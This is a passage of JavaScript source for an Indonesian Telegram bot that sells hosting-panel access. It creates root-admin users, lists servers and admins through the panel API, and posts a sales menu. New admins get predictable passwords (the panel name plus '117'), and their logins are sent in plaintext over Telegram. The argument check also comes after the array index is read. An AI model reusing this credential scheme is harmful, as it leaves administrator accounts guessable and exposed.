  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(chatId, 'Format Salah! Penggunaan: /createadmin namapanel,idtele');
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: `${panelName}@buyer.san`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
TYPE: user
➟ ID: ${user.id}
➟ USERNAME: ${user.username}
➟ EMAIL: ${user.email}
➟ NAME: ${user.first_name} ${user.last_name}
➟ LANGUAGE: ${user.language}
➟ ADMIN: ${user.root_admin}
➟ CREATED AT: ${user.created_at}
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(telegramId,`
╭──❏「 INFO DATA ADMIN PANEL 」❏
┃➥  Login : ${domain}
┃➥  Username : ${user.username}
┃➥  Password : ${password} 
┗━━━━━[ RUZTAN MESUM ]━━━━
➡️ Rules : 
• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!

NGEYEL? KICK NO REFF NO DRAMA
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
THANKS FOR BUYING AT RUZTAN - XD😁✌️
    `);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, 'Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti.');
  }
});
fs.readFile(adminfile, (err, data) => {
  if (err) {
    console.error(err);
  } else {
    adminIDs = JSON.parse(data);
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;   
// Check if the user is the Owner
    const adminUsers = JSON.parse(fs.readFileSync(adminfile));
    const isAdmin = adminUsers.includes(String(msg.from.id));   
    if (!isAdmin) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner, Hubungi Admin Saya Untuk Menjadi Owner atau Users Premium...', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
                    ]
                ]
            }
        });
        return;
    }
    let page = 1; // Mengubah penggunaan args[0] yang tidak didefinisikan sebelumnya
    try {
        let f = await fetch(`${domain}/api/application/servers?page=${page}`, { // Menggunakan backticks untuk string literal
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });
        let res = await f.json();
        let servers = res.data;
        let messageText = "Daftar server aktif yang dimiliki:\n\n";
        for (let server of servers) {
            let s = server.attributes;

            let f3 = await fetch(`${domain}/api/client/servers/${s.uuid.split('-')[0]}/resources`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${pltc}`
                }
            });
            let data = await f3.json();
            let status = data.attributes ? data.attributes.current_state : s.status;

            messageText += `ID Server: ${s.id}\n`;
            messageText += `Nama Server: ${s.name}\n`;
            messageText += `Status: ${status}\n\n`;
        }

        bot.sendMessage(chatId, messageText);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listadmin
bot.onText(/\/listadmin/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const adminUsers = JSON.parse(fs.readFileSync(adminfile));
    const isAdmin = adminUsers.includes(String(msg.from.id));
    if (!isAdmin) {
        bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner, Hubungi Admin Saya Untuk Menjadi Owner atau Users Premium...', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
                    ]
                ]
            }
        });
        return;
    }
    let page = '1';
    try {
        let f = await fetch(`${domain}/api/application/users?page=${page}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
            }
        });
        let res = await f.json();
        let users = res.data;
        let messageText = "Berikut list admin :\n\n";
        for (let user of users) {
            let u = user.attributes;
            if (u.root_admin) {
                messageText += `🆔 ID: ${u.id} - 🌟 Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                messageText += `${u.username}\n`;
                messageText += `${u.first_name} ${u.last_name}\n\n`;
                messageText += 'By Ruztan';
            }
        }
        messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `Total Admin: ${res.meta.pagination.count}`;
        const keyboard = [
            [
                { text: 'BACK', callback_data: JSON.stringify({ action: 'back', page: parseInt(res.meta.pagination.current_page) - 1 }) },
                { text: 'NEXT', callback_data: JSON.stringify({ action: 'next', page: parseInt(res.meta.pagination.current_page) + 1 }) }
            ]
        ];
        bot.sendMessage(chatId, messageText, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        //▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// batas akhir
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
    }
});
  bot.onText(/\/panel/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const owner = '6350764506'; // Ganti dengan ID pemilik bot 
    const text12 = `*Hi @${sender} 👋*
    
CARA BIKIN PANEL BY hitsssh 🔥

𝗖𝗔𝗥𝗔 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 :
𝗿𝗮𝗺 𝘂𝘀𝗲𝗿𝘀,𝗜𝗱

𝗰𝗼𝗻𝘁𝗼𝗵 : /𝟭𝗴𝗯 yanto,𝟭𝟯𝟰𝟰𝟱𝟱𝘅𝘅𝘅

UNTUK ID TELE NYA BISA CEK KETIK /cekid 

𝗕𝘂𝘆 𝗣𝗿𝗲𝗺? 𝗕𝘂𝘆 𝗩𝗽𝘀? 𝗕𝘂𝘆 𝗔𝗱𝗺𝗶𝗻𝗣&𝗣𝘁 𝗣𝗮𝗻𝗲𝗹? 𝗕𝘂𝘆 𝗦𝗰? 𝗣𝘃 (@hitsssh)`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🖥️ Buy Panel', url: 'https://t.me/hitsssh' }, { text: '👤 Buy Admin', url: 'https://t.me/hitsssh' }],
                [{ text: '🇲🇨 Buy Vps', url: 'https://t.me/hitsssh' }]
            ]
        }
    };
    bot.sendPhoto(chatId, settings.pp, { caption: text12, parse_mode: 'Markdown', reply_markup: keyboard });
});      